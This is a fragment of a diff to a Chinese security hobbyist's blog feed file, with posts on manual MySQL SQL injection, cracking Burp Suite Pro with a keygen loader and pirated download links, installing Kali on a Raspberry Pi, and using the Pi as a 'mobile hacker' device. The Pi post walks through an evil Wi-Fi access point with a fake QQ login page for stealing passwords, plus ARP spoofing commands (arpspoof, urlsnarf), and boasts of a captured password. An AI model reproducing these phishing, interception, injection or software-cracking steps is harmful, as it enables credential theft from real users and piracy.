-![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623090208938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
-有特定目标
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:php?id&#x3D;site:xxxx.com</span><br></pre></td></tr></table></figure>
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623090405991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
-<h2 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h2><ol>
-<li><p>手工简单识别</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and 1=1/ and 1=2</span><br><span class="line">and&quot;1=1/and&quot;1=2</span><br><span class="line">and 1 like 1/and 1 like 2</span><br></pre></td></tr></table></figure></li>
-<li><p>工具识别</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -m   要指定的文件     多个目标URL保持到文件里-m就会用文件里的</span><br><span class="line">sqlmap --craw    sqlmap对目标网站进行爬取然后依次进行测试</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<h2 id="mysql手动注入"><a href="#mysql手动注入" class="headerlink" title="mysql手动注入"></a>mysql手动注入</h2><ol>
-<li>mysql结构<br> mysql内库<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719142556272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
-<li>核心原理:<br>MySq内置的 Information schema库,它功能强大,是我们进行MySq注入的基石!<br>通过 information schema我们可以窥透整个 MySQL的运行情况,也可以查看到数据库中所有的数据信息。</li>
-</ol>
-<ol start="3">
-<li><p>查询数据库核心语法</p>
-<table>
-<thead>
-<tr>
-<th align="center">功能名称</th>
-<th align="right">查询语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">查库</td>
-<td align="right">select schema_name from information_schema.schemata</td>
-</tr>
-<tr>
-<td align="center">查表</td>
-<td align="right">select table_name from information_schema.tables where table_schema=’库名’</td>
-</tr>
-<tr>
-<td align="center">查列</td>
-<td align="right">select column_name from information_schema.columns where table_name=’列名’;</td>
-</tr>
-<tr>
-<td align="center">查数据</td>
-<td align="right">select 列名 from 库名.表名</td>
-</tr>
-</tbody></table>
-<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>   <strong>1.查库</strong><br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719150848459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-</li>
-</ol>
-<p><strong>2.查表</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154201445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.查列</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154345793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以不输入单引号<br>比如<code>&#39;users&#39;</code>列名转换成哈希<code>7573657273</code><br>步骤<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155359180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155412516.png" alt="在这里插入图片描述"><br>然后在语句里面输入<code>0x和上面生成出来的哈希</code><br>意思<br>0x是告诉我是16进行的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155656713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<ol start="4">
-<li>提示</li>
-</ol>
-<pre><code> **提示1**:
- 所有类型的sql注入，都是基于査库、表、列语句     
-
-**提示2**:
-sql注入，都是基于査库、表、列语句  
-査询的场緊：可利用limit限定返回的数置及位置，依次査询</code></pre>
-<p>回显数据的场聚：<em>concat</em>链接多个数据成为一条返回结果<br>咧<br>    1. limit函数<br>上面的这个limit，下面是他的演示，就是叫修改就可以查看其他的行<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071917081938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    2. group_concat()函数<br>    他可以叫多个列组合到一个里面，应为sql注入，可能输出的有限制，<br>    找个函数就是，叫内容都输出的一个里面<br>    咧</p>
-<pre><code>    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719174303407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
-
-
-
-**提示3:**.
-在一些场景，想要快速获取数据，需要接住工具，如：burp</code></pre>
-<h2 id="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡"><a href="#靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡" class="headerlink" title="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs Less1-4关卡"></a>靶场是sqli-labs进行手动sql注入1-4到这个地方：<a href="https://blog.csdn.net/qq_41860876/article/details/107405426">Sqli-labs Less1-4关卡</a></h2>]]></content>
+      
+      
+        <tags>
+            
+            <tag> union联合查询注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>用树莓派做移动黑客</title>
+      <link href="/2020/08/27/2.%20%E6%A0%91%E8%8E%93%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <url>/2020/08/27/2.%20%E6%A0%91%E8%8E%93%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="我玩树莓派的经历"><a href="#我玩树莓派的经历" class="headerlink" title="我玩树莓派的经历"></a>我玩树莓派的经历</h2><p><strong>自学习网络安全也有好几年了</strong></p><p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派，</strong></p><p><strong>树莓派安装kali在下面的连接查看</strong><br><a href="https://blog.csdn.net/qq_41860876/article/details/105409811"><strong>1. 树莓派安装kali linux和说明</strong></a></p><h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>设备有一个树莓派4b4g，<br>支持监听和AP的网卡用来，进行AP发送和连接<br>U盘用来存数据<br>充电宝用来供电<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416150348284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173032688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173057535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="搭建恶意wifi"><a href="#搭建恶意wifi" class="headerlink" title="搭建恶意wifi"></a>搭建恶意wifi</h2><ol><li>可以通过恶意wifi从而获得wifi密码<ol><li>获取到密码后，可以进行内网渗透，进行破坏就容易的多了</li></ol></li><li>通过恶意wifi盗窃用户密码<ol><li>可以抓包获取用户和密码，通过dns欺骗访问指定自己的恶意网页实现键盘记录盗窃密码，等等等等 </li></ol></li><li>通过恶意wif往下载程序里面注入病毒木马</li><li>通过恶意wif可以获取个人隐私</li></ol><p><strong>还有很多就不多说了，</strong></p><p>搭建恶意wifi有很多方法<br>有很多种现成的工具，<br>也可以进行手动搭建<br>这个我就用现成的工具了，手动搭建这个文章可能写的很长很长<br>Wifiphisher工具<br><a href="https://github.com/wifiphisher/wifiphisher"><strong>github地址</strong></a></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416153656244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416165223437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>做了一个qq登录的页面</strong><br>应为时间浪费太长我就修改了一下里面的内容,内容有不好</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416160055172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击也有很多种<br>通过欺骗对方叫流量转发给我然后我在转发出去<br><strong>查看网络里的人</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174024830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启动路由转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof   -t 目标ip  -r  网关地址</span><br></pre></td></tr></table></figure><p><strong>可以加上-i指定网卡</strong></p><p>进行arp欺骗<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174659711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>urlsnarf -i wlan0抓取目标访问的网站<br>还有很多<br>成功获取到密码<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416182046801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
+      
+      
       <categories>
-        <category>sql注入</category>
+          
+          <category> 树莓派kali linux </category>
+          
       </categories>
-      <tags>
-        <tag>网易web安全渗透  手动sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali2020教程Burpsuite破解汉化版安装</title>
-    <url>/2020/08/27/kali2020%E6%95%99%E7%A8%8BBurpsuite%E7%A0%B4%E8%A7%A3%E6%B1%89%E5%8C%96%E7%89%88%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<p>BurpSuite<br>废话不多说正题</p>
-<ol>
-<li><p>下载<br>下面是我提供的下载版本和工具<br>[Burp Suite2.0.1.1版]<a href="https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A">https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A</a>提取码：t3hp<br>[汉化包]<a href="https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ">https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ</a>提取码：b8u0<br>[java ]<a href="https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw">https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw</a>提取码：6346</p>
-<ol start="2">
-<li>进行配置<br>叫下载好的保存到一个目录里<br>然后解压出来叫下载好的jdk-8u161-linux-x64.tar.gz<br>命令</li>
-</ol>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">tar -xzvf jdk<span class="number">-8u</span>161-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104131200946.PNG" alt="在这里插入图片描述"><br>解压好进行配置运行下面的代码<br>1</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JAVA_HOME=/root/桌面/jdk1<span class="number">.8</span>/</span><br></pre></td></tr></table></figure>
-<p>2</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:&#123;JAVA_HOME&#125;/lib:JREHOME/libexportPATH=&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
-<p>3</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /root/桌面/jdk1<span class="number">.8</span>/bin/java <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>4</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/javac javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>5</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure>
-<p>6</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure>
-<p> 7</p>
- <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac</span><br></pre></td></tr></table></figure>
-<p>然后运行</p>
-</li>
-</ol>
-<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
-查看配置成功</code></pre>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104132555181.png" alt="在这里插入图片描述"><br>3. 开始破解<br>1.先创建一个a.sh文件<br>文件里面a.sh内容</p>
-<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -jar burp-loader-keygen.ja</span><br></pre></td></tr></table></figure>
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140446983.png)
-加执行权限
-
-
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chmod +x a.sh</span><br></pre></td></tr></table></figure>
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140551606.png)
-然后运行
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./a,sh</span><br></pre></td></tr></table></figure>
-运行后会出现![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140607834.png)</code></pre>
-<p>2.创建一个burp.sh文件<br>文件里面a.sh内容</p>
-<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=utf<span class="number">-8</span> -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar  burpsuite_pro_v2<span class="number">.0</span><span class="number">.11b</span>eta.jar</span><br></pre></td></tr></table></figure>
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140820842.png)</code></pre>
-<p>加执行权限</p>
-<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chmod +x burp.sh</span><br></pre></td></tr></table></figure>
-运行
-
-
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./burp.sh</span><br></pre></td></tr></table></figure>
-可以看到是中文的了
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104141137443.png)</code></pre>
-<ol start="3">
-<li>安装<br> 下面叫内容复制到里面<pre><code>                 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104141229717.png)</code></pre>
-<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141306592.png" alt="在这里插入图片描述"><br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019110414131589.png" alt="在这里插入图片描述"><br>成功<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141336122.png" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141342661.png" alt="在这里插入图片描述"></li>
-</ol>
-<h1 id="作者QQ2737977997"><a href="#作者QQ2737977997" class="headerlink" title="作者QQ2737977997"></a>作者QQ2737977997</h1>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 用树莓派做移动黑客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>树莓派安装kali linux和说明</title>
+      <link href="/2020/08/27/1.%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali%20linux%E5%92%8C%E8%AF%B4%E6%98%8E/"/>
+      <url>/2020/08/27/1.%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali%20linux%E5%92%8C%E8%AF%B4%E6%98%8E/</url>
+      
+        <content type="html"><![CDATA[<p><strong>我玩树莓派的经历，自学习网络安全也有好几年了</strong></p><p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派</strong>，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我买的是</p><ul><li>树莓派4b 4g</li><li>32g内存卡和读卡器</li><li>电源</li><li>壳子</li><li>摄像头</li></ul><h2 id="开始安装kali-linux"><a href="#开始安装kali-linux" class="headerlink" title="开始安装kali linux"></a>开始安装kali linux</h2><p>玩过kali的人，其实在树莓派安装kali很简单的<br>官方下载地址：<a href="https://www.offensive-security.com/kali-linux-arm-images/">https://www.offensive-security.com/kali-linux-arm-images/</a><br><strong>我下载的是这个</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409142019890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成要解压出来，<br>也可以校验一下是否下载时缺少什么吗<br><strong>记得要叫下载好的文件解压出来</strong><br>用win32diskimager工具可以在百度上下载到<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416125004522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="插入树莓派启动即可"><a href="#插入树莓派启动即可" class="headerlink" title="插入树莓派启动即可"></a>插入树莓派启动即可</h2><p>如果没有屏幕，可以插入网线，</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130407849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用Xshell 6工具去连接ssh<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130455310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130544575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接然后输入<strong>账号默认是root密码是toor</strong><br>看一下已经连接上去了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130645277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我就用他默认的源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>运行命令进行更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get  update</span><br><span class="line">apt-get  upgrade</span><br></pre></td></tr></table></figure><p>安装远程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt  install xrdp</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start xrdp</span><br></pre></td></tr></table></figure><p>设置开机自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable  xrdp</span><br></pre></td></tr></table></figure><p>连接<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132549991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置中文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132632601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>解决乱码问题</strong><br>乱码是应为缺少字体<br>安装字体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure><h2 id="我QQ2737977997"><a href="#我QQ2737977997" class="headerlink" title="我QQ2737977997"></a>我QQ2737977997</h2>]]></content>
+      
+      
       <categories>
-        <category>Burpsuite破解</category>
+          
+          <category> 树莓派kali linux </category>
+          
       </categories>
-      <tags>
-        <tag>Burpsuite破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>树莓派安装kali linux和说明</title>
-    <url>/2020/08/27/1.%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali%20linux%E5%92%8C%E8%AF%B4%E6%98%8E/</url>
-    <content><![CDATA[<p><strong>我玩树莓派的经历，自学习网络安全也有好几年了</strong></p>
-<p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派</strong>，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我买的是</p>
-<ul>
-<li>树莓派4b 4g</li>
-<li>32g内存卡和读卡器</li>
-<li>电源</li>
-<li>壳子</li>
-<li>摄像头</li>
-</ul>
-<h2 id="开始安装kali-linux"><a href="#开始安装kali-linux" class="headerlink" title="开始安装kali linux"></a>开始安装kali linux</h2><p>玩过kali的人，其实在树莓派安装kali很简单的<br>官方下载地址：<a href="https://www.offensive-security.com/kali-linux-arm-images/">https://www.offensive-security.com/kali-linux-arm-images/</a><br><strong>我下载的是这个</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409142019890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成要解压出来，<br>也可以校验一下是否下载时缺少什么吗<br><strong>记得要叫下载好的文件解压出来</strong><br>用win32diskimager工具可以在百度上下载到<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416125004522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="插入树莓派启动即可"><a href="#插入树莓派启动即可" class="headerlink" title="插入树莓派启动即可"></a>插入树莓派启动即可</h2><p>如果没有屏幕，可以插入网线，</p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130407849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用Xshell 6工具去连接ssh<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130455310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130544575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" 